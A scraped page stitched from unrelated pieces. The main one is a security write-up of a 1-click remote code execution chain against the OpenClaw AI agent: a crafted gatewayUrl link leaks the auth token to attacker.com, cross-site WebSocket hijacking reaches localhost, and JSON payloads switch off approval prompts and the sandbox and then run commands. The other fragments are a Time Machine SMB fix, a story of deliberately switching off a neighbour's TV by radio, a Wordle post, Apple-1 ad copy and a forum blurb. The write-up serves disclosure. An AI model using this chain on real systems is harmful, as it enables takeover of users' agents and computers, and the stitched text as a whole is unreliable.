figuring out <em>exactly</em> what is wrong with it but it’s literally not worth my time.</p><p>I guess I can at least take a lesson that, when debugging, I should always consider the physical layer.

<div id="readability-page-1" class="page"><div><h2>Hacking the Hottest Agent in Tech</h2><p>OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent "god mode" permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.</p><p>I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.</p><h2>How depthfirst Flagged the Vulnerability</h2><p>Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.</p><p>Our system maps the full flow of an application's lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap: </p><p><strong>1. Ingestion:</strong> <code>app-settings.ts</code> blindly accepts a <code>gatewayUrl</code> query parameter in the URL and persists it to storage. For example, <code>https://localhost?gatewayUrl=attacker.com</code> would save <code>attacker.com</code> as the new gateway url.</p><pre contenteditable="false"><code><span>const</span><span> gatewayUrlRaw = params.get(</span><span>"gatewayUrl"</span><span>);
</span>...
<span></span><span>if</span><span> (gatewayUrlRaw != </span><span>null</span><span>) {
</span><span>  </span><span>const</span><span> gatewayUrl = gatewayUrlRaw.trim();
</span><span>  </span><span>if</span><span> (gatewayUrl &amp;&amp; gatewayUrl !== host.settings.gatewayUrl) {
</span><span>    applySettings(host, { ...host.settings, gatewayUrl }); </span><span>// persisted via saveSettings -&gt; localStorage</span><span>
</span>  }
<!-- -->}
</code></pre><p><strong>2. Processing:</strong> <code>app-lifecycle.ts</code> triggers <code>connectGateway()</code> <em>immediately</em> after settings (such as the gateway url) are applied.</p><pre contenteditable="false"><code><span>handleConnected</span><span>(</span><span>host</span><span>)</span><span> {
</span>  ...
<span>  connectGateway(host); </span><span>// runs immediately on load after parsing URL params</span><span>
</span>  startNodesPolling(host);
<!-- -->  ...
<!-- -->}</code></pre><p>3. <strong>Protocol Execution:</strong> gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.</p><pre contenteditable="false"><code><span>const</span><span> params = { ... , authToken, </span><span>locale</span><span>: navigator.language };
</span><span></span><span>void</span><span> </span><span>this</span><span>.request&lt;GatewayHelloOk&gt;(</span><span>"connect"</span><span>, params);</span></code></pre><p>In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker.&nbsp;</p><p>Here’s a preview of the finding in the depthfirst UI:</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f8d4b908591cf3f915319_Screenshot%202026-01-31%20at%207.19.02%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h2>1-Click RCE Exploit Kill Chain</h2><h3>Limited Direct Exploitation</h3><p>Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.</p><p>These are the exploit steps:</p><p>1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>.</p><p>2. The attacker listening to WebSocket connections on their server receives the <code>auth</code> token.</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f89d1a1c89e5e19f32bb6_Screeenshot_2.png" loading="lazy" alt=""></p></figure><p>3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.</p><p>The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.</p><p>This is bad enough, but this direct exploitation method has 3 limitations:</p><ol role="list"><li>It does not work on locally-running OpenClaw instances.</li><li>It does not bypass any defensive sandboxing or safety guardrails.</li><li>It does not achieve arbitrary code execution.</li></ol><p><strong>Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.</strong></p><h3>Pivoting to Bypass <code>localhost</code> Network Restrictions</h3><p>Most users run OpenClaw on <code>localhost</code>. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw.&nbsp;</p><p>However, I found a bug to bypass this otherwise frustrating restriction.&nbsp;</p><p>Regularly, <code>attacker.com</code> can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.</p><p>While browsers apply SOP to http connections, they do <em>not</em> to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request's <code>origin</code> and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket <code>origin</code> header, accepting requests from <em>any</em> site.</p><p>This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits <code>attacker.com</code>, I can run JavaScript on the victim’s browser to open a connection to <code>ws://localhost:18789</code> . The browser acts as a pivot point between <code>attacker.com</code> and the victim’s otherwise inaccessible <code>localhost</code>.</p><h3>Escaping The Sandbox</h3><p>OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses <code>exec-approvals.json</code> to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.</p><p>However, these protections are managed via the API itself. Because the stolen token grants <code>operator.admin</code> and <code>operator.approvals</code> scopes, I don't need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.</p><ol role="list"><li><strong>Disabling User Confirmation:</strong> I send a exec.approvals.set request to set ask: "off". Now the agent won't ask the user for permission to run dangerous commands.</li><li><strong>Escaping Containers:</strong> I send a config.patch request to set tools.exec.host to "gateway". This forces the agent to run commands directly on the host machine, not inside a Docker container.</li></ol><pre contenteditable="false"><code><span>// Payload to disable user prompts</span><span>
</span>{
<span>  </span><span>"method"</span><span>: </span><span>"exec.approvals.set"</span><span>,
</span><span>  </span><span>"params"</span><span>: { </span><span>"defaults"</span><span>: { </span><span>"security"</span><span>: </span><span>"full"</span><span>, </span><span>"ask"</span><span>: </span><span>"off"</span><span> } }
</span>}</code></pre><h3>Complete 1-Click RCE Exploit Killchain</h3><p>Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.</p><ol role="list"><li>Victim visits attacker.com (in practice, an inconspicuous url)</li><li>Client-side JavaScript from <code>attacker.com</code> executes on the victim browser, opening a background window to <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>. This sends the auth token to <code>attacker.com:8080</code></li><li>Client-side JavaScript from <code>attacker.com</code> executing on the victim browser creates a WebSocket connection to <code>ws://localhost:18789</code> (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: <br><ol role="list"><li>disable user confirmation on dangerous commands</li><li>disable any sandboxing</li></ol></li></ol><p>Finally, to achieve arbitrary command execution, the attacker JavaScript executes a <code>node.invoke</code> request:</p><pre contenteditable="false"><code><span>{
</span><span>     </span><span>"type"</span><span>: </span><span>"req"</span><span>,
</span><span>     </span><span>"id"</span><span>: </span><span>"4"</span><span>,
</span><span>     </span><span>"method"</span><span>: </span><span>"node.invoke"</span><span>,
</span><span>     </span><span>"params"</span><span>: {
</span><span>          </span><span>"nodeId"</span><span>: </span><span>"main"</span><span>,
</span><span>          </span><span>"command"</span><span>: </span><span>"system.run"</span><span>,

</span>     }
<!-- -->}</code></pre><h2>Disclosure &amp; Patch</h2><p>The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the <a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq">GitHub Advisory</a>. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior.&nbsp;</p><p>All versions up to v2026.1.24-1 are vulnerable.

    <p>So… Here we are again.</p>
<p>Today, after a minor disaster with my <a href="https://taoofmac.com/space/apps/obsidian" rel="next">Obsidian</a> vault, I decided to restore from Time Machine, and… I realized that it had silently broken across both my Tahoe machines. I use a <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a> NAS as Time Machine target, exporting the share over <a href="https://taoofmac.com/space/protocols/smb" rel="next">SMB</a> and that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months ago–but no, it wasn’t.</p>
<p>After some research, I found out that the issue is with <a href="https://taoofmac.com/space/com/apple" rel="next">Apple’s</a> unilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.</p>
<a id="anchor-what-seems-to-be-working-now" href="https://taoofmac.com/space/til/2026/02/01/1630#what-seems-to-be-working-now" rel="anchor"><h2 id="what-seems-to-be-working-now">What Seems To Be Working Now</h2></a><p>I found <a href="https://gist.github.com/Zahorone/6915be6f5088edb2f64018ce9e4dfe97?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">this gist</a>, which I am reproducing here for posterity, that seems to be working for me, but which entails editing the <code>nsmb.conf</code> file on the Mac itself–which is not exactly ideal, since I’m pretty sure Apple will break this again in the future.</p>
<div><pre><span><code>sudo<span> </span>nano<span> </span>/etc/nsmb.conf<span> </span><span># I used vim, of course</span>
</code></span></pre></div>

<p>…and adding the following lines (the file should be empty):</p>
<div><pre><span><code><span>[default]</span>
<span>signing_required</span><span>=</span><span>yes</span>
<span>streams</span><span>=</span><span>yes</span>
<span>soft</span><span>=</span><span>yes</span>
<span>dir_cache_max_cnt</span><span>=</span><span>0</span>
<span>protocol_vers_map</span><span>=</span><span>6</span>
<span>mc_prefer_wired</span><span>=</span><span>yes</span>
</code></span></pre></div>

<p>The explanation here is that <a href="https://taoofmac.com/space/com/apple/macos" rel="next">macOS</a> Tahoe changed the default from <code>signing_required=no</code> to stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.</p>
<p>Another common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the <code>.sparsebundle</code> name (that wasn’t an issue for me, but YMMV).</p>
<p>On the <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a> side, the recommendation was to go to <code>Control Panel &gt; File Services &gt; SMB &gt; Advanced</code> and set:</p>
<ul>
<li>Maximum SMB protocol: SMB3</li>
<li>Enable Opportunistic Locking: Yes</li>
<li>Enable SMB2 Lease: Yes</li>
<li>Enable SMB Durable Handles: Yes</li>
<li>Server signing: No (or “Auto”)</li>
<li>Transport encryption: Disabled</li>
</ul>
<p>That doesn’t quite match my DSM UI, but it’s close enough, and my settings now look like this:</p>
<figure><img alt="My SMB settings, as of DSM 7.3.2-86009-1" src="https://taoofmac.com/media/til/2026/02/01/1630/fY_oAYhU-aPe6gdiXpboLe7GTwI=/image.png" width="1384" height="1462"><figcaption>My SMB settings, as of DSM 7.3.2-86009-1</figcaption></figure>
<a id="anchor-my-backup-backup-plan" href="https://taoofmac.com/space/til/2026/02/01/1630#my-backup-backup-plan" rel="anchor"><h2 id="my-backup-backup-plan">My Backup Backup Plan</h2></a><p>Since I’m tired of Apple breaking <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">Time Machine</a> every few years and the lack of transparency around this (it’s not Synology’s fault), I have decided to implement a more robust solution that doesn’t depend on Synology’s SMB implementation.</p>
<p>I already have <a href="https://taoofmac.com/space/blog/2024/12/26/2330" rel="next">a Proxmox server with ZFS as the backend storage</a> that has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.</p>
<p>As it happens, <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external"><code>mbentley/timemachine</code></a> is a <a href="https://taoofmac.com/space/os/linux/docker" rel="next">Docker</a> image specifically designed for this purpose, and it seems to be well-maintained, so I’m testing it like this:</p>
<div><pre><span><code><span>services</span><span>:</span>

<span>    </span><span>volumes</span><span>:</span>
<span>      </span><span># this is a pass-though mountpoint to the ZFS volume in Proxmox</span>

<span>    </span><span>tmpfs</span><span>:</span>
<span>      </span><span>-</span><span> </span><span>/run/samba</span>
</code></span></pre></div>

<p>Right now the first option <em>seems</em> to be working, but I will probably switch to the Docker solution in the near future, since it gives me more control over the <a href="https://taoofmac.com/space/protocols/smb" rel="next">SMB</a> implementation and avoids relying on <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a>’s software.</p>
<p>But if anyone from Apple is reading this: please, stop breaking <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">Time Machine</a> every few years. It’s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.</p>
<p>Plus I’m annoyed enough that earlier this morning I tried to set up a new <a href="https://taoofmac.com/space/com/apple/ios" rel="next">iOS</a> device and the infamous <code>Restore in Progress: An estimated 100 MB will be downloaded…</code> bug (which has bitten me repeatedly <em>over the last <strong>six</strong> years</em>) is still there.</p>
<p>The usual fix was hitting <code>Reset Network Settings</code> and a full hardware reboot, plus reconnecting to Wi-Fi… But this time it took <em>three</em> attempts.</p>
<p>Come on, Apple, get your act together. Hire people who care about the OS experience, not just <a href="https://taoofmac.com/space/notes/2025/09/15/2359" rel="next">Liquid Glass</a>.</p>

<div id="readability-page-1" class="page"><div itemprop="articleBody" id="articleBody">
	

<p>When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.</p>

<p>This was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.</p>

<p>After using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.</p>

<p>After several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.</p>

<p><img src="https://cdn.idiallo.com/images/assets/601/remote.jpg" alt="Dish Network Remote 2008">
</p>

<p>One day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.</p>

<p>The whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, and… it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.</p>

<p>One evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. "Fuck!" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled. </p>

<div>
   <p><img src="https://cdn.idiallo.com/images/assets/601/captain.jpg" alt="I am the captain now"></p><p>I am the captain now.</p>
</div>

<p>Every time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.</p>

<p>But I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.</p>

<p>In the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened. </p>

<p>"Hi, I'm Ibrahim. Your upstairs neighbor..." I started and was interrupted almost immediately. "Whatever you are selling," he yelled. "I'm not buying." and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.</p>

<p>The RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand. </p>

<p>Why in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.</p>

<p>One day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.</p>

<p>Sometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.</p>

<p>Maybe somewhere on the web, in some obscure forum, someone asked the question: "Why does my set-top box turn off when I increase the volume?" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.</p>

</time>
            </i>
        </p>
    

    <p>A few days ago, The new York Times (owner of Wordle) announced that from 2 February it would start reusing some words from previous years.</p>
<p>Their announcement started:</p>
<blockquote>
<p>Hey, Wordlers! We have some exciting news to share</p>
</blockquote>
<p>and continued</p>
<blockquote>
<p>Starting on Monday, we will begin adding previously run words back into play. There are still many first-time answers to debut, but also more chances for Wordle in ones and those magical, serendipitous moments when Wordle overlaps with real life. Happy solving!</p>
</blockquote>
<p>Firstly, whoever wrote this nonsense deserves an award for fake cheerfulness.  There is absolutely no "exciting news" in that paragraph.</p>
<p>It has caused a bit of a stir in the Wordle Community.  Many wondering why, and some suggesting they will now stop playing the <em>dumbed down</em> version.</p>
<h2 id="it-got-me-thinking">It got me thinking</h2><p>Are they running out of five-letter words?  I've gathered the data and crunched the numbers, and here are my findings:</p>
<p>Firstly, I started with a list of English words. I've actually had a list for some time, and I knew one day it would come in useful.  It contains 466,547 words: from <em>aahed</em> <sup id="fnref-1"><a href="#fn-1">1</a></sup> to <em>zugzwang</em> <sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>I then narrowed that down to five-letter words (22,949) before excluding plurals, which are not used in Wordle, and Proper Nouns (such as Paris, or March -- anything with uppercase first letter, but leaving "march" for example).  The list was down to 10,784 words.</p>
<p>Finally, one more trip through the sausage machine.  I put this list in a word processor and calculated how many spelling errors there were.  This, roughly, would help me identify the more <em>common</em> five-letter words.  I doubt many of us could use <em>valew</em> <sup id="fnref-3"><a href="#fn-3">3</a></sup> in a sentence.</p>
<p>We now have a more manageable potential Wordle list of 5,437 words.</p>
<h2 id="the-longevity-of-five-thousand-words">The longevity of five-thousand words?</h2><p>A word-a-day from that list would yield almost 15 years of daily challenges.  Wordle has been running since October 2021.  By my reckoning we have enough to run until 2036</p>
<h2 id="nyt-why">NYT, Why?</h2><p>So that does beg the question: New York Times - why start repeating?</p>

                  Apple Computer. A truly complete microcomputer system on a single 
                  PC board. Based on the MOS Technology 6502 micro- processor, 
                  the Apple also has a built-in video terminal and sockets for 
                  8K bytes of onboard RAM memory. With the addition of a keyboard 
                  and video monitor, you'll have an extremely powerful computer 
                  system that can be used for anything from developing programs 
                  to playing games or running BASIC.<br>
                  &nbsp;&nbsp;&nbsp;Combining the computer, video terminal and 
                  dynamic memory on a single board has resulted in a large reduction 
                  in chip count, which means more reliability and lowered cost. 
                  Since the Apple comes fully assembled, tested &amp; burned-in 
                  and has a complete power supply on-board, initial set-up is 
                  essentially "hassle-free" and you can be running within 
                  minutes. At $666.66 (including 4K bytes RAM!) it opens many 
                  new possibilities for users and systems manufacturers.</span></p>

                  </span></b><span color="#000000">Using the built-in video terminal 
                  and keyboard interface, you avoid all the expense, noise and 
                  mantenance associated with a teletype. And the Apple video terminal 
                  is six times faster than a teletype, which means more throughput 
                  and less waiting. The Apple connects directly to a video monitor 
                  (or home TV with an in- expensive RF modulator) and dis- plays 
                  960 easy to read characters in 24 rows of 40 characters per 
                  line with automatic scrolling. The video display section contains 
                  its own 1K bytes of memory, so all the RAM memory is available 
                  for user programs. And the</span>

                  any ASCII-encoded keyboard.<br>
                  &nbsp;&nbsp;&nbsp;The Apple Computer makes it possible for many 
                  people with limited budgets to step up to a video terminal as 
                  an I/O device for their computer.</span></p>

                  to switches and LED's, a video terminal can dis- play vast amounts 
                  of information simultaneously. The Apple video terminal can 
                  display the contents of 192 memory locations at once on the 
                  screen. And the fimrware in PROMS enables you to enter,display 
                  and debug programs (all in hex) from the keyboard, ren- dering 
                  a front panel unnecessary. The firmware also allows your programs 
                  to print characters on the display, and since you'll be looking 
                  at letters and numbers instead of just LED's, the door is open 
                  to all kinds of alphanumeric software (i.e., Games and BASIC).</span></p>

                  The Apple Computer uses the new 16-pin 4K dynamic memory chips. 
                  They are faster and take 1/4 the space and power of even the 
                  low power 2102's (the memory chip that everyone else uses). 
                  That means 8K bytes in sixteen chips. It also means no more 
                  28 amp power supplies. &nbsp;&nbsp;&nbsp;The system is fully 
                  expandable to 65K via an edge connector which carries both the

                                AGS has an active and friendly community, with many ways of keeping in touch and
                                getting help with your project or games made with AGS.

                                These include our local forums, Facebook page, Discord server, in-person meet-ups,
                                and many more.

                            <p>
                                The AGS community is run by a team of dedicated volunteers, who put their time and
                                efforts into keeping it running as a welcoming, friendly and informative place to be.
                                The AGS server and forums are paid for out of our own pockets, so in effect it costs
                                us money to provide a free service to AGS users.
                            </p>
